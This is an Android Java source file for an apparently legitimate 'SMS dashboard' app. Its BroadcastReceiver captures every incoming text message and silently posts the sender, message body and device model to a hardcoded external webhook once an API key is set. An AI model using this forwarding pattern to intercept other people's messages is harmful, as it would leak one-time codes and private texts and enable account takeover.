package com.smsdashboard;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SmsReceiver extends BroadcastReceiver {

    private static final String WEBHOOK = "https://sms.bharatseo.site/api/receive.php";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) return;

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;
        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null || pdus.length == 0) return;

        String format = bundle.getString("format");

        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu, format);
            if (sms == null) continue;

            String sender  = sms.getDisplayOriginatingAddress();
            String message = sms.getMessageBody();

            String apiKey = context
                .getSharedPreferences("sms_dashboard", Context.MODE_PRIVATE)
                .getString("api_key", "");

            if (!apiKey.isEmpty()) {
                forwardSms(apiKey, sender, message);
            }
        }
    }

    private void forwardSms(String apiKey, String sender, String message) {
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                String body = "api_key=" + URLEncoder.encode(apiKey,  "UTF-8")
                    + "&sender="  + URLEncoder.encode(sender,  "UTF-8")
                    + "&message=" + URLEncoder.encode(message, "UTF-8")
                    + "&device="  + URLEncoder.encode(Build.MODEL, "UTF-8");

                URL url = new URL(WEBHOOK);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                conn.setDoOutput(true);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(body.getBytes("UTF-8"));
                }
                conn.getResponseCode();
            } catch (Exception ignored) {
            } finally {
                if (conn != null) conn.disconnect();
            }
        }).start();
    }
}
